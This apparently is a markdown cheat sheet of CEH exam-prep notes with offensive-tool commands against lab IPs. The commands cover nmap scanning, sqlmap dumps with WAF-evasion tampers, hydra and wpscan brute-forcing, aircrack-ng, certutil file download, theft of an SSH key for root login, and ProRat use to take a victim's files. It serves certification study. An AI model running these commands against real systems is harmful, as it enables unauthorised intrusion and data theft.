# CEH-Notes
 
> sudo netdiscover -r 192.168.1.0/24

## Resource Sharing
> **Wget:**<br/>
> Single file: wget http://192.168.0.101:8000/filename -O C:\path\to\destination\filename<br/>
> All files: Navigate to PasteFolder > wget -r -np -nd -A "*" http://192.168.0.101:8000/folder/<br/>
> <br/>
> **SCP:**<br/>
> Start ssh service.<br/>
> Linux: service ssh start<br/>
> Windows: Settings>Apps>Optional Features>Add Feature>Install OpenSSH Server | Powershell:Start-Service sshd<br/>
> File: scp /path/to/local/file username@192.168.0.104:/path/to/destination<br/>
> Folder: scp -r /path/to/local/folder username@192.168.0.104:/path/to/destination/folder<br/>
><br/>
> **Python HTTP Server**<br/>
> cd OpenSharingFolder<br/>
> python3 -m http.server 8000<br/>
> Open VM, navigate to http://192.168.0.101:8000<br/>
> certutil -urlcache -f http://192.168.0.101:8000/file.exe file.exe    | Windows Transfer


## NMAP
> Best <br/>
> nmap -sn 192.168.1.0/24 <br/>
> nmap -A -T4 -p- 192.168.1.0/24 <br/>
> nmap -sC -sV -Pn -T4 -vv -p- 192.168.1.0/24 <br/>
> nmap --script vuln -Pn -T4 -p- 192.168.1.0/24 <br/>
> <br/>
> Firewall/IDS, if opened <br/>
> nmap -sS -v -p- 192.168.1.0/24  <br/>
> nmap -f -p- 192.168.1.0/24 <br/>
> <br/>
> UDP Scan <br/>
> nmap -sU --top-ports 25 -p- 192.168.1.0/24 <br/>
> <br/>
> nmap --script smb-os-discovery.nse IP <br/>

## SQLMap <br/>
> sqlmap -r req.txt -dbs<br/>
> sqlmap -r req.txt -D DBName --tables<br/>
> sqlmap -r req.txt -D DBName --tables --columns<br/>
> sqlmap -r req.txt -D DBName --dump<br/>
> WAF: sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump

## WordPress <br/>
> <b>WP SCAN</b><br/>
> wpscan --url http://192.168.0.1 <br/>
> wpscan --url http://192.168.0.1 -e u    #User Enum <br/>
> wpscan --url http://192.168.0.1 --enumerate u <br/>
> wpscan --url http://192.168.0.1 --usernames /home/user.txt --passwords(-P) /home/pass.txt  <br/>
> wpscan --url http://192.168.0.1 -u john --passwords /home/pass.txt  <br/>

> <b>METASPLOIT</b> <br/>
> msfconsole : <br/>
> use auxilliary/scanner/http/wordpress_login_enum <br/>
> show options <br/>
>	set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt <br/>
>	set RHOSTS 192.168.0.1  (target ip) <br/>
>	set RPORT 8080          (target port) <br/>
>	set TARGETURI http://192.168.0.1:8080/ <br/>
>	set USERNAME admin <br/>

## HYDRA <br/>
> hydra -L /home/user.txt -P /home/pass.txt 192.168.0.1 ftp <br/>
> hydra -L /home/user.txt -P /home/pass.txt ftp://192.168.0.1 <br/>
> hydra -L /home/user.txt -P /home/pass.txt 192.168.0.1 ssh <br/>
> hydra -L /home/user.txt -P /home/pass.txt ssh://192.168.0.1 <br/>
> hydra -L usernames.txt -P passwords.txt -s 25 -vV 192.168.0.104 smtp<br/>

## STEGANOGRAPHY <br/>
> <b>SNOW (Windows)</b><br/>
> <b>Hide:</b>SNOW -C -m "Hey Hacker" -p "hack" abc.txt abcd.txt<br/>
> <b>Extract:</b>SNOW -C -p "hack" abcd.txt<br/>

> <b>OpenStego (Windows)</b><br/>
> Click on Extract Data<br/>
> Select Stego file<br/>
> Select output folder<br/>
> Enter password & CLick on Extract Data Button<br/>

> <b>StegHide (Linux)</b><br/>
> <b>Hide: </b>steghide embed -cf cover.png -ef secret.txt -p 1234 <br/>stegcrack
> <b>Extract:</b> steghide extract -sf steg.file<br/>
> Enter Password & Hit Enter<br/>

> <b>Stegcracker (Linux)</b><br/>
> stegcracker steg.file <br/>

## CRYPTOGRAPHY <br/>
> <b>HashCalc (Windows)</b><br/>
> Open File<br/>
> Click on Calculate Button<br/>

> <b>VeraCrypt (Windows)</b><br/>
> Select any Volume A,B,D,E<br/>
> Select Encrypted Folder<br/>
> Click on mount button<br/>
> Enter Password<br/>
> Open File Manager<br/>
> Open Newly created drive and open secret.txt file<br/>

> <b>Crack Hash</b><br/>
> [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)<br/>
> [Hashes](https://hashes.com/en/decrypt/hash)<br/>
> [CrackStation](https://crackstation.net/)<br/>

> <b>BCTextEncoder (Windows)</b><br/>
> Paste Hash Value<br/>
> Click on Decode<br/>
> Enter Password<br/>

> <b>Cryptool (Windows)</b><br/>
> **RC4:**<br/>
> Open File<br/>
> Encrypt/Decrypt > Symmetric(modern) > RC4<br/>
> Enter bit length (EX:14)<br/>
> Click on Decrypt<br/>
>
> **DES(ECB):**<br/>
> Open File<br/>
> Encrypt/Decrypt > Symmetric(modern) > DES(ECB)<br/>
> Select bit length if given in qus<br/>
> Click on Decrypt<br/>

## WireShark <br/>
> For credentials: http.request.method == POST<br/>
> For DoS Attack:<br/>
>                 Statistics > IPv4 Statistics > Source and Destination Address<br/>
>                 Apply Filter:- tcp.flags.syn == 1 and tcp.flags.ack == 0<br/>

## Android <br/>
> **Normal** <br/>
> nmap ip -sV -p 5555 <br/>
> adb connect 192.168.0.1:5555 <br/>
> adb shell <br/>
> cd sdcard <br/>
> cat secret.txt <br/>
>  <br/>
>  **ELF**<br/>
> cd sdcard/scan <br/>
> sudo adb pull /sdcard/scan/ <br/>
> ent evil.elf <br/>
> sha384sum evil.elf <br/>

## EOL <br/>
> nmap -Pn --script vuln 192.168.0.1<br/>
> Copy the CVE and Paste it on Google<br/>
> Check the severity | For Ex: 10<br/>

## FQDN  <br/>
> nmap -p 389 -sV -iL ip.list <br/>
> nmap -p389 -sV 192.168.0.1 <br/>
> FQDN: DC.pentester.team <br/>

## WIFI  <br/>
> aircrack-ng cap.file<br/>
> aircrak-ng -w wordlist.txt cap.file<br/>
> aircrak-ng -b 2a:25:zd:54:48:as -w wordlist.txt cap.file<br/>
> aircrak-ng -a2 -b 2a:25:zd:54:48:as -w wordlist.txt cap.file<br/>

## Privilege Escalation<br/>
> Login in ssh<br/>
> sudo -l<br/>
> sudo -i<br/>
> <br/>
> **id_rsa**<br/>
> su user<br/>
> cd .ssh<br/>
> ls<br/>
> cat id_rsa & Copy it<br/>
> Paste on host Machine<br/>
> chmod 600 id_rsa<br/>
> ssh root@192.168.0.1 -i id_rsa -p 22 <br/>

## Malware<br/>
> **ProRat**<br/>
> Enter Victim IP<br/>
> Click on connect<br/>
> Enter Password<br/>
> Click on Search Files "Searching for *.txt"<br/>
> Click on File Manager<br/>
> Move to Secret Directory & Download the secret file<br/>
> 
> **Static Analysis ELF with  DIE**<br/>
> Open Die<br/>
> Upload File<br/>
> Click on File Info<br/>
